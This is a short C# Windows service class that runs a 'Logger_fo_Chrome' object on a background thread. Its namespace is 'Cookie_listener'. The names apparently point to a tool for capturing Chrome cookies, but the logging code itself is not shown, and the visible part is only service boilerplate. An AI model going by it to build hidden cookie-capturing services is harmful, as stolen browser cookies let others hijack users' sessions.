using System;
using System.Diagnostics;
using System.ServiceProcess;
using System.Threading;
using System.Threading.Tasks;

namespace Cookie_listener
{
    public partial class Service_fo_chrome : ServiceBase
    {
        Logger_fo_Chrome _logger;
        public Service_fo_chrome()
        {
            InitializeComponent();
            CanStop = true;
            CanShutdown = true;
            CanPauseAndContinue = true;
            AutoLog = true;
        }

        protected override void OnStart(string[] args) => Task.Run(() => Go());

        private void Go()
        {
            lock (this)
            {
                try
                {
                    _logger = new Logger_fo_Chrome();
                    Thread loggerThread = new Thread(new ThreadStart(_logger.Start));
                    loggerThread.Start();
                }
                catch (Exception ex) { EventLog.WriteEntry(ex.Message); }                                             
            }
        }

        protected override void OnStop()
        {
            _logger.Stop();
            Thread.Sleep(1000);
        }
    }
}
